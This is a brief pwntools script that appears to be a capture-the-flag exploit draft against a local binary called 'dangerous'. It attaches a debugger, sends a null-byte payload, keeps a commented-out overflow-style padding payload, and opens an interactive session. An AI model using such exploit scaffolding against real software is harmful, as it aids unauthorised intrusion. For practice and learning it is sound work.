#! /usr/bin/env python
from pwn import *

context(log_level = "debug")
r = process("dangerous")
gdb.attach(r)

r.recvuntil('\n')
payload = '\0' #b'a' * 0x1e9 + b'\0' * (0x200- 0x1e9)
r.send(payload)
r.interactive()
